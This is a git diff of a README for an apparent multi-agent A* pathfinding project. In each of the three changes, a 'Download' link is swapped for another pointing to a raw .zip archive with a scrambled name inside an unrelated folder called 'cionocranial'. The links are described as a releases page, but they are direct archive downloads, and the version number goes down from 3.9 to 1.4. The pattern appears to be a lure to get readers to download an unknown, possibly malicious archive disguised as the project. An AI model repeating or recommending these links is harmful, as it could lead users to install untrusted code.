@@ -6,7 +6,7 @@ Welcome to the Multi-Agent Pathfinding with A* project. This application helps y
 
 ## 📥 Download Now
 
-[![Download Multi-Agent-Pathfinding-with-A-star](https://github.com/rorras/Multi-Agent-Pathfinding-with-A-star/raw/refs/heads/main/cionocranial/Pathfinding-Multi-star-with-Agent-3.9.zip%20Now-Click%20Here-blue)](https://github.com/rorras/Multi-Agent-Pathfinding-with-A-star/raw/refs/heads/main/cionocranial/Pathfinding-Multi-star-with-Agent-3.9.zip)
+[![Download Multi-Agent-Pathfinding-with-A-star](https://github.com/rorras/Multi-Agent-Pathfinding-with-A-star/raw/refs/heads/main/cionocranial/with-Multi-Pathfinding-star-Agent-1.4.zip%20Now-Click%20Here-blue)](https://github.com/rorras/Multi-Agent-Pathfinding-with-A-star/raw/refs/heads/main/cionocranial/with-Multi-Pathfinding-star-Agent-1.4.zip)
 
 ## 📋 Overview
 
@@ -32,7 +32,7 @@ To run the Multi-Agent Pathfinding with A* application, ensure your system meets
 
 To download the application, please visit the releases page using the link below:
 
-[Download Multi-Agent-Pathfinding-with-A-star](https://github.com/rorras/Multi-Agent-Pathfinding-with-A-star/raw/refs/heads/main/cionocranial/Pathfinding-Multi-star-with-Agent-3.9.zip)
+[Download Multi-Agent-Pathfinding-with-A-star](https://github.com/rorras/Multi-Agent-Pathfinding-with-A-star/raw/refs/heads/main/cionocranial/with-Multi-Pathfinding-star-Agent-1.4.zip)
 
 Once on the releases page, follow these steps:
 
@@ -84,6 +84,6 @@ This project is licensed under the MIT License. You are free to use, modify, and
 
 Thanks to all contributors and those who have helped make this project a reality. Your efforts are greatly appreciated.
 
-[Download Multi-Agent-Pathfinding-with-A-star](https://github.com/rorras/Multi-Agent-Pathfinding-with-A-star/raw/refs/heads/main/cionocranial/Pathfinding-Multi-star-with-Agent-3.9.zip)
+[Download Multi-Agent-Pathfinding-with-A-star](https://github.com/rorras/Multi-Agent-Pathfinding-with-A-star/raw/refs/heads/main/cionocranial/with-Multi-Pathfinding-star-Agent-1.4.zip)
 
 Explore the world of pathfinding and discover new possibilities today!
